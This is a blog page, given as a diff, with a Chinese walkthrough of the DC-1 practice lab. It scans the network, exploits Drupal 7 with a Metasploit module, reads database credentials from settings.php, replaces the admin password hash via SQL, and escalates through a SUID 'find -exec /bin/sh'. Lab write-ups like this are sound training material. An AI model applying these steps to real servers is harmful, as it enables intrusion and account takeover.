@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    DC-1 |
+    
+    yichen&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+<meta name="referrer" content="no-referrer" />
+  <article id="post-dpzhhx" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      DC-1
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/03/16/dpzhhx/" class="article-date">
+  <time datetime="2020-03-16T11:48:33.000Z" itemprop="datePublished">2020-03-16</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+                            
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p>使用  arp-scan -l  看一下局域网中存活的主机</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584346592984-02161ee5-1ca7-4a01-8d94-e8954f90c00a.png#align=left&display=inline&height=130&name=image.png&originHeight=223&originWidth=907&size=61740&status=done&style=none&width=527" alt="image.png"></p>
+<p>192.168.149.150，用  nmap  扫一下：nmap -A 192.168.149.150</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584346708002-37d001ce-0bfb-4892-ad5d-9773b311ac32.png#align=left&display=inline&height=451&name=image.png&originHeight=708&originWidth=681&size=151827&status=done&style=none&width=434" alt="image.png"></p>
+<p>可以看到有个 80  口开着，可以先去看一下是干啥的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584346804039-dfa7b77b-a2ad-4853-bd48-5d66c51366b5.png#align=left&display=inline&height=391&name=image.png&originHeight=781&originWidth=1274&size=68493&status=done&style=none&width=637" alt="image.png"></p>
+<p>一个用  drupal cms  搭建起来的网站，扫一波目录</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584348397239-bec2f2e2-fe09-4995-aeff-276eb4ae70d1.png#align=left&display=inline&height=75&name=image.png&originHeight=149&originWidth=1483&size=41021&status=done&style=none&width=741.5" alt="image.png"></p>
+<p>访问一下  robots.txt，里面有个 UPGRANDE.txt</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584348491823-1715e672-226e-4653-8a1c-ebe8dec22dff.png#align=left&display=inline&height=333&name=image.png&originHeight=666&originWidth=452&size=63016&status=done&style=none&width=226" alt="image.png"></p>
+<p>也就是说他现在版本是 7.x  的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584349731230-6aabb3c2-a51f-448a-915d-565d5dfd45c2.png#align=left&display=inline&height=240&name=image.png&originHeight=479&originWidth=653&size=50201&status=done&style=none&width=326.5" alt="image.png"></p>
+<p>用  msf  搜一下看看有没有现成的：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584350279907-dfca81a5-2dea-40f5-83c4-3710b2cfb29f.png#align=left&display=inline&height=162&name=image.png&originHeight=324&originWidth=1392&size=101676&status=done&style=none&width=696" alt="image.png"></p>
+<p>经过测试，使用 2018  年的那个可以</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584350662531-3d6c359b-393b-489b-9af0-177637e4b53d.png#align=left&display=inline&height=279&name=image.png&originHeight=557&originWidth=1265&size=108348&status=done&style=none&width=632.5" alt="image.png"></p>
+<p>设置一下攻击目标：<code>set RHOSTS 192.168.149.150</code></p>
+<p>然后执行  exploit  开始攻击，成功之后直接 ls  就发现了  flag1.txt</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584350826999-90054011-cbab-4849-8ee7-4db7070c58fa.png#align=left&display=inline&height=339&name=image.png&originHeight=678&originWidth=1106&size=192393&status=done&style=none&width=553" alt="image.png"></p>
+<p>cat  一下看看内容，告诉我们一个好的  cms  需要  config  文件，</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584350871138-3730c6a9-002d-447a-ba43-59c1653de6d8.png#align=left&display=inline&height=69&name=image.png&originHeight=79&originWidth=524&size=10630&status=done&style=none&width=456" alt="image.png"></p>
+<p>去找一下这个  config  文件，Drupal 的默认配置文件为 /var/www/sites/default/settings.php<br>同时找到了  flag2  和   数据库的用户名与密码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584351124560-8bb67ac0-bc6c-4b73-b879-e1a022217cb7.png#align=left&display=inline&height=417&name=image.png&originHeight=623&originWidth=571&size=61283&status=done&style=none&width=382" alt="image.png"></p>
+<p>连接不上，自闭? python -c “import pty;pty.spawn(‘/bin/bash’)”  这样开一个交互试试，nice</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584361261096-7a9646e3-51e9-40be-8aa3-dd92a4c8dfc3.png#align=left&display=inline&height=351&name=image.png&originHeight=701&originWidth=790&size=104104&status=done&style=none&width=395" alt="image.png"></p>
+<p>select * from users;，发现了  admin ，以及他密码的 hash 值</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584361486038-815063e7-6eb2-442e-a148-b6fc0d48a609.png#align=left&display=inline&height=182&name=image.png&originHeight=364&originWidth=1634&size=82045&status=done&style=none&width=817" alt="image.png"></p>
+<p><a href="http://drupalchina.cn/node/2128" target="_blank" rel="noopener">http://drupalchina.cn/node/2128</a><br>参考这个方法，把密码给改成 yichen，拿到 hash  后去 mysql 里面替换就可以了<br>$S$DAowqHa2RDeEsjEuWpJWUE28BF0Hs4QjzoFsMRb8Qvz9Hl87oJKj</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584362330675-dc5b21df-7cc6-4091-83d0-d4b214e518a5.png#align=left&display=inline&height=98&name=image.png&originHeight=141&originWidth=947&size=28293&status=done&style=none&width=650" alt="image.png"></p>
+<p>update users set pass=’$S$DAowqHa2RDeEsjEuWpJWUE28BF0Hs4QjzoFsMRb8Qvz9Hl87oJKj’ where name=’admin’;</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584362550428-0965f14c-6e28-44da-bfa7-19180f2f2a5c.png#align=left&display=inline&height=282&name=image.png&originHeight=435&originWidth=1070&size=76131&status=done&style=none&width=692" alt="image.png"></p>
+<p>这时候再用 用户名： admin 密码：yichen  去登录网站就登陆成功了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584362688943-fb55bcb0-224e-4a53-8bea-8a1521f06cf0.png#align=left&display=inline&height=473&name=image.png&originHeight=946&originWidth=1895&size=91985&status=done&style=none&width=947.5" alt="image.png"></p>
+<p>在这个地方，发现  flag3，看一下内容</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584362785551-c6518587-2a17-4125-9593-1a78fbef5d5c.png#align=left&display=inline&height=473&name=image.png&originHeight=947&originWidth=1889&size=129064&status=done&style=none&width=944.5" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584362842016-2a4ad9b1-fd33-4494-a575-c59c6ae33e14.png#align=left&display=inline&height=256&name=image.png&originHeight=512&originWidth=921&size=106692&status=done&style=shadow&width=461" alt="image.png"></p>
+<p>emmm，在 etc/passwd  看到  flag4  这个用户</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584363052149-4c4dc256-770a-4fd1-b651-483353f07261.png#align=left&display=inline&height=383&name=image.png&originHeight=587&originWidth=723&size=125528&status=done&style=none&width=472" alt="image.png"></p>
+<p>在 home/flag4  下面放着  flag4.txt</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584363123232-269e0d98-d548-4048-af15-3d05577467a1.png#align=left&display=inline&height=181&name=image.png&originHeight=278&originWidth=653&size=48878&status=done&style=none&width=424" alt="image.png"></p>
+<p>提权：find / -user root -perm -4000 -print 2&gt;/dev/null  可以发现  find</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584363284288-233c55e9-df32-4da4-bde0-1cfc32a1a06e.png#align=left&display=inline&height=298&name=image.png&originHeight=446&originWidth=760&size=68980&status=done&style=none&width=508" alt="image.png"></p>
+<p>然后：find ./ -exec “/bin/sh” ;</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584363347829-8ec119b0-4872-4936-9ac9-926e09f44116.png#align=left&display=inline&height=104&name=image.png&originHeight=138&originWidth=537&size=16530&status=done&style=none&width=406" alt="image.png"></p>
+<p>最终，在  root  目录下发现  thefinalflag.txt</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584363687147-5c054d8a-b6bd-412e-8564-afcc072cab4a.png#align=left&display=inline&height=194&name=image.png&originHeight=305&originWidth=611&size=34802&status=done&style=none&width=388" alt="image.png"></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/03/16/dpzhhx/" data-id="ckco53qb900028ou92wn66ncj" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+      <a href="/2020/03/21/aedgn4/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            PWN入门（格式化字符串漏洞）
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/03/16/nhdeg6/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">PWN入门（ROP Tricks）</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+    <div class="vcomments" id="vcomments"></div>
+    
+<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
+
+        <script>
+            new Valine({
+                el: '#vcomments',
+                appId: '',
+                appKey: '',
+                notify: 'false',
+                verify: 'true',
+                avatar: 'mp',
+                pageSize: '10',
+                placeholder: '请输入...'
+            })
+        </script>
+        
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 yichen&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/head.png" alt="yichen&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">主页</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">归档</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener">语雀</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://mp.weixin.qq.com/s/_xKmbanQddRoX2SoAcihWA" target="_blank" rel="noopener">关于</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
